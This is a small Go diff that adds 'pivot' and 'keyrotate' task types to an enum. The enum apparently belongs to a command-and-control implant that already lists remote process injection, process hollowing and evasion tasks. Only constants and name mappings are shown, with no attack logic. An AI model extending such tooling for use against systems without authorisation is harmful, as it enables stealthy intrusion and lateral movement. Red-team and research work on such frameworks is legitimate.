@@ -30,6 +30,8 @@ const (
 	TaskInject      uint8 = 14  // Remote process injection
 	TaskHollow      uint8 = 15  // Process hollowing
 	TaskEvasion     uint8 = 16  // Run/re-run evasion techniques
+	TaskPivot       uint8 = 17  // Start/stop/list pivot relays
+	TaskKeyRotate   uint8 = 18  // Session key rotation
 )
 
 // Task status
@@ -82,6 +84,10 @@ func TaskTypeName(t uint8) string {
 		return "hollow"
 	case TaskEvasion:
 		return "evasion"
+	case TaskPivot:
+		return "pivot"
+	case TaskKeyRotate:
+		return "keyrotate"
 	default:
 		return "unknown"
 	}
